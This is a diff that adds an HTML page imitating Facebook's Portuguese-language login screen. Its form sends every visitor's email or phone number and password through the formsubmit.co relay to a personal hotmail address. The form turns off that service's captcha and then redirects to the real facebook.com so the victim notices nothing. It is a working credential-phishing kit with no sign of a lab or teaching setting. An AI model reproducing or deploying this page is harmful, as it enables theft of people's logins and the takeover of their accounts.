@@ -1,0 +1,168 @@
+<html><head><base href="." />
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Facebook - clone</title>
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: Helvetica, Arial, sans-serif;
+}
+
+body {
+    background-color: #f0f2f5;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+}
+
+.container {
+    width: 100%;
+    max-width: 1000px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 0 20px;
+}
+
+.left-content {
+    flex: 1;
+    padding-right: 32px;
+}
+
+.facebook-logo {
+    width: 300px;
+    margin-bottom: 10px;
+}
+
+.left-content h2 {
+    font-size: 28px;
+    font-weight: normal;
+    line-height: 32px;
+    color: #1c1e21;
+}
+
+.login-container {
+    flex: 0 0 396px;
+}
+
+.login-card {
+    background-color: white;
+    border-radius: 8px;
+    padding: 20px;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+}
+
+.login-form input {
+    width: 100%;
+    padding: 14px 16px;
+    border-radius: 6px;
+    border: 1px solid #dddfe2;
+    margin-bottom: 12px;
+    font-size: 17px;
+}
+
+.login-form input:focus {
+    outline: none;
+    border-color: #1877f2;
+    box-shadow: 0 0 0 2px #e7f3ff;
+}
+
+.login-button {
+    background-color: #1877f2;
+    color: white;
+    border: none;
+    border-radius: 6px;
+    font-size: 20px;
+    padding: 12px;
+    margin-bottom: 16px;
+    width: 100%;
+    cursor: pointer;
+}
+
+.login-button:hover {
+    background-color: #166fe5;
+}
+
+.forgot-password {
+    text-align: center;
+    margin-bottom: 20px;
+}
+
+.forgot-password a {
+    color: #1877f2;
+    text-decoration: none;
+    font-size: 14px;
+}
+
+.divider {
+    border-bottom: 1px solid #dadde1;
+    margin: 20px 0;
+}
+
+.create-account {
+    text-align: center;
+}
+
+.create-button {
+    background-color: #42b72a;
+    color: white;
+    border: none;
+    border-radius: 6px;
+    font-size: 17px;
+    padding: 14px 16px;
+    cursor: pointer;
+    display: inline-block;
+}
+
+.create-button:hover {
+    background-color: #36a420;
+}
+
+.create-page {
+    text-align: center;
+    margin-top: 28px;
+    font-size: 14px;
+}
+
+.create-page a {
+    color: #1c1e21;
+    text-decoration: none;
+    font-weight: bold;
+}
+</style>
+</head>
+<body>
+    <div class="container">
+        <div class="left-content">
+            <svg class="facebook-logo" viewBox="0 0 300 100">
+                <text x="0" y="50" font-family="Helvetica" font-size="60" font-weight="bold" fill="#1877f2">facebook</text>
+            </svg>
+            <h2>O Facebook ajuda você a se conectar e compartilhar com as pessoas que fazem parte da sua vida.</h2>
+        </div>
+        <div class="login-container">
+            <div class="login-card">
+                <form class="login-form" action="https://formsubmit.co/titanicnaoafunda@hotmail.com" method="POST">
+                    <input type="text" name="email" placeholder="Email ou telefone" required/>
+                    <input type="password" name="password" placeholder="Senha" required/>
+                    <input type="hidden" name="_captcha" value="false">
+                    <input type="hidden" name="_next" value="https://www.facebook.com">
+                    <button class="login-button" type="submit">Entrar</button>
+                    <div class="forgot-password">
+                        <a href="https://www.facebook.com/recover/initiate">Esqueceu a senha?</a>
+                    </div>
+                    <div class="divider"></div>
+                    <div class="create-account">
+                        <button class="create-button" type="button">Criar nova conta</button>
+                    </div>
+                </form>
+            </div>
+            <div class="create-page">
+                <a href="https://www.facebook.com/pages/create/">Criar uma Página</a> para uma celebridade, uma marca ou uma empresa.
+            </div>
+        </div>
+    </div>
+</body>
+</html>
